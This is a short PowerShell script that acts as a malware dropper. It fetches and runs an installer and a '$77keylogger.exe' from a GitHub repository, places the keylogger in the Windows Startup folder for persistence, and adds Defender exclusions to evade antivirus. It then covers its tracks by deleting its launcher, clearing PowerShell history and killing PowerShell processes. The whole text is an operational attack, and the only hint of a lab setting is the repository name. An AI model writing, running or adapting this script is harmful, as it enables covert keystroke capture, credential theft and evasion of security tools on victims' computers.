Invoke-WebRequest https://raw.githubusercontent.com/polar313fs-byte/lab-test/main/Install.exe -O Install.exe
Start-Process Install.exe -Wait
Set-Location "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" #Go to the folder in which we will donwload files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
Invoke-WebRequest https://raw.githubusercontent.com/polar313fs-byte/lab-test/main/$77keylogger.exe -O $77keylogger.exe #Download keylogger script
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`$77keylogger.exe" -Force #Add exception for keylogger.exe file in antivirus
Start-Process $77keylogger.exe #Start $77keylogger script
Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
Set-ExecutionPolicy restricted -Force #Reset script execution policy
Remove-Item C:\Users\Public\Documents\startScript.ps1 #Delete ps1 script
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
taskkill -F /IM powershell.exe #Kill all powershell process
